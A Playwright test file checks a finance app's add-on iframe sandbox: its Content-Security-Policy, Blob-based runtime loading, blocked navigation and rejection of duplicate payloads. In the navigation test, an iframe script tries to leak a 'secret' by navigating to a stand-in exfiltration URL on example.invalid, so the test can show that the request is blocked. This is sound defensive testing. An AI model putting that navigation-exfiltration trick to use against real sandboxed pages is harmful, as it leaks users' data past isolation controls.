import { expect, test } from "@playwright/test";
import { createHash } from "node:crypto";

const SANDBOX_BOOTSTRAP_HASH = "sha256-s/UhdlprnzFxx+iXOtDj2n/Jk+MSRz1g/1lyBtFatVw=";
const NAVIGATION_SCRIPT = `
          parent.postMessage({ type: "navigationAttempt" }, "*");
          window.location.href = window.name;
        `;
const NAVIGATION_SCRIPT_HASH = `sha256-${createHash("sha256")
  .update(NAVIGATION_SCRIPT)
  .digest("base64")}`;

const ADDON_CODE = `
import React from "react";
import { createRoot } from "react-dom/client";
import { TickerAvatar } from "@wealthfolio/ui";

export function enable(context) {
  createRoot(context.ui.root).render(React.createElement(TickerAvatar, { symbol: "AAPL" }));
}
`;

const HARNESS_HTML = `<!doctype html>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' '${SANDBOX_BOOTSTRAP_HASH}' '${NAVIGATION_SCRIPT_HASH}' blob:; style-src 'self' 'unsafe-inline' blob:; img-src 'self' data: blob:; font-src 'self' data:; frame-src 'none'">
<main>Sandbox harness</main>`;

test("boots the opaque sandbox from parent-delivered Blobs without child requests", async ({
  baseURL,
  page,
}) => {
  const harnessUrl = new URL("/__addon-sandbox-test-harness__", baseURL).toString();
  await page.route(harnessUrl, (route) =>
    route.fulfill({
      body: HARNESS_HTML,
      contentType: "text/html",
    }),
  );

  const childNetworkRequests: string[] = [];
  const childLocalRequests: string[] = [];
  const parentRequests: string[] = [];
  page.on("request", (request) => {
    const url = new URL(request.url());
    if (request.frame().parentFrame()) {
      if (url.protocol === "http:" || url.protocol === "https:") {
        childNetworkRequests.push(url.pathname);
      } else {
        childLocalRequests.push(request.url());
      }
    } else {
      parentRequests.push(url.pathname);
    }
  });
  await page.goto(harnessUrl);

  const result = await page.evaluate(
    async ({ addonCode }) => {
      const addonId = "sandbox-browser-test";
      const channel = "wealthfolio:addon-sandbox:v1";
      const nonce = crypto.randomUUID();
      const [scriptResponse, stylesheetResponse, sandboxResponse] = await Promise.all([
        fetch("/__generated__/addon-sandbox-runtime.js", { cache: "no-cache" }),
        fetch("/__generated__/addon-sandbox-runtime.css", { cache: "no-cache" }),
        fetch("/addon-sandbox.html", { cache: "no-cache" }),
      ]);
      const [script, stylesheet, sandboxHtml] = await Promise.all([
        scriptResponse.blob(),
        stylesheetResponse.blob(),
        sandboxResponse.text(),
      ]);
      const csp = new DOMParser()
        .parseFromString(sandboxHtml, "text/html")
        .querySelector('meta[http-equiv="Content-Security-Policy"]')
        ?.getAttribute("content");

      const embedderCsp = document
        .querySelector('meta[http-equiv="Content-Security-Policy"]')
        ?.getAttribute("content");

      return new Promise<{ csp: string; embedderCsp: string; sandbox: string }>(
        (resolve, reject) => {
          const iframe = document.createElement("iframe");
          iframe.setAttribute("sandbox", "allow-scripts");
          iframe.name = new URLSearchParams({
            addonId,
            hostBaseUrl: new URL("/", window.location.href).toString(),
            nonce,
            themeClass: "light",
          }).toString();
          iframe.srcdoc = sandboxHtml;
          const timer = window.setTimeout(() => reject(new Error("Sandbox did not load")), 15_000);
          let addonLoaded = false;
          let tickerLogoReturned = false;

          const finish = () => {
            if (!addonLoaded || !tickerLogoReturned) return;
            window.clearTimeout(timer);
            window.removeEventListener("message", onMessage);
            resolve({
              csp: csp || "",
              embedderCsp: embedderCsp || "",
              sandbox: iframe.getAttribute("sandbox") || "",
            });
          };

          const post = (type: string, payload: Record<string, unknown> = {}) => {
            iframe.contentWindow?.postMessage({ addonId, channel, nonce, type, ...payload }, "*");
          };

          const onMessage = (event: MessageEvent) => {
            const message = event.data;
            if (
              event.source !== iframe.contentWindow ||
              message?.addonId !== addonId ||
              message.channel !== channel ||
              message.nonce !== nonce
            ) {
              return;
            }

            if (message.type === "bootstrapReady") {
              post("loadRuntime", { protocolVersion: 1, script, stylesheet });
            } else if (message.type === "ready") {
              if (message.runtimeProtocolVersion !== 1) {
                reject(new Error(`Unexpected runtime protocol ${message.runtimeProtocolVersion}`));
                return;
              }
              post("loadAddon", { code: addonCode, files: [] });
            } else if (message.type === "hostAssetRequest") {
              void (async () => {
                const response = await fetch(
                  `/ticker-logos/${encodeURIComponent(String(message.symbol))}.png`,
                );
                const result = response.ok ? await response.blob() : null;
                post("rpcResponse", { ok: true, requestId: message.requestId, result });
                tickerLogoReturned = true;
                finish();
              })();
            } else if (message.type === "loaded") {
              addonLoaded = true;
              finish();
            } else if (message.type === "loadError") {
              reject(new Error(`${message.phase || "load"}: ${message.error || "unknown error"}`));
            }
          };

          window.addEventListener("message", onMessage);
          document.body.appendChild(iframe);
        },
      );
    },
    { addonCode: ADDON_CODE },
  );

  expect(result.sandbox).toBe("allow-scripts");
  expect(result.embedderCsp).toContain(`'${SANDBOX_BOOTSTRAP_HASH}'`);
  expect(result.embedderCsp).toContain("frame-src 'none'");
  expect(result.csp).toContain("default-src 'none'");
  expect(result.csp).not.toMatch(/'self'|https?:|tauri:|asset:/);
  expect(childNetworkRequests).toEqual([]);
  expect(childLocalRequests.every((url) => url.startsWith("blob:"))).toBe(true);
  expect(parentRequests).toEqual(
    expect.arrayContaining([
      "/__generated__/addon-sandbox-runtime.js",
      "/__generated__/addon-sandbox-runtime.css",
      "/addon-sandbox.html",
      "/ticker-logos/AAPL.png",
    ]),
  );
});

test("blocks sandbox navigation before it becomes a network request", async ({ baseURL, page }) => {
  const harnessUrl = new URL("/__addon-sandbox-navigation-test__", baseURL).toString();
  await page.route(harnessUrl, (route) =>
    route.fulfill({
      body: HARNESS_HTML,
      contentType: "text/html",
    }),
  );

  const childNetworkRequests: string[] = [];
  page.on("request", (request) => {
    if (!request.frame().parentFrame()) return;
    const url = new URL(request.url());
    if (url.protocol === "http:" || url.protocol === "https:") {
      childNetworkRequests.push(request.url());
    }
  });
  await page.goto(harnessUrl);

  await page.evaluate(
    (navigationScript) =>
      new Promise<void>((resolve) => {
        const targets = [
          new URL(
            "/__addon-sandbox-navigation-probe__?secret=proof",
            window.location.href,
          ).toString(),
          "https://example.invalid/exfil?secret=proof",
        ];
        const frames = targets.map((target) => {
          const iframe = document.createElement("iframe");
          iframe.setAttribute("sandbox", "allow-scripts");
          iframe.name = target;
          iframe.srcdoc = `<script>${navigationScript}<\/script>`;
          return iframe;
        });
        const attempted = new Set<MessageEventSource>();
        window.addEventListener("message", function onMessage(event) {
          if (
            frames.some((iframe) => event.source === iframe.contentWindow) &&
            event.data?.type === "navigationAttempt"
          ) {
            attempted.add(event.source!);
            if (attempted.size === frames.length) {
              window.removeEventListener("message", onMessage);
              resolve();
            }
          }
        });
        for (const iframe of frames) {
          document.body.appendChild(iframe);
        }
      }),
    NAVIGATION_SCRIPT,
  );
  await page.waitForTimeout(250);

  expect(childNetworkRequests).toEqual([]);
});

test("rejects a duplicate runtime payload", async ({ baseURL, page }) => {
  const harnessUrl = new URL("/__addon-sandbox-duplicate-test__", baseURL).toString();
  await page.route(harnessUrl, (route) =>
    route.fulfill({
      body: HARNESS_HTML,
      contentType: "text/html",
    }),
  );
  await page.goto(harnessUrl);

  const error = await page.evaluate(async () => {
    const addonId = "sandbox-duplicate-test";
    const channel = "wealthfolio:addon-sandbox:v1";
    const nonce = crypto.randomUUID();
    const [script, stylesheet, sandboxHtml] = await Promise.all([
      fetch("/__generated__/addon-sandbox-runtime.js").then((response) => response.blob()),
      fetch("/__generated__/addon-sandbox-runtime.css").then((response) => response.blob()),
      fetch("/addon-sandbox.html").then((response) => response.text()),
    ]);

    return new Promise<{ error: string; phase: string }>((resolve, reject) => {
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "allow-scripts");
      iframe.name = new URLSearchParams({
        addonId,
        hostBaseUrl: new URL("/", window.location.href).toString(),
        nonce,
      }).toString();
      iframe.srcdoc = sandboxHtml;
      const timer = window.setTimeout(
        () => reject(new Error("Duplicate payload was not rejected")),
        10_000,
      );
      window.addEventListener("message", function onMessage(event) {
        const message = event.data;
        if (event.source !== iframe.contentWindow || message?.addonId !== addonId) return;
        if (message.type === "bootstrapReady") {
          const payload = {
            addonId,
            channel,
            nonce,
            protocolVersion: 1,
            script,
            stylesheet,
            type: "loadRuntime",
          };
          iframe.contentWindow?.postMessage(payload, "*");
          iframe.contentWindow?.postMessage(payload, "*");
        } else if (message.type === "loadError") {
          window.clearTimeout(timer);
          window.removeEventListener("message", onMessage);
          resolve({ error: message.error, phase: message.phase });
        }
      });
      document.body.appendChild(iframe);
    });
  });

  expect(error).toEqual({
    error: "Duplicate sandbox runtime payload",
    phase: "validating runtime assets",
  });
});
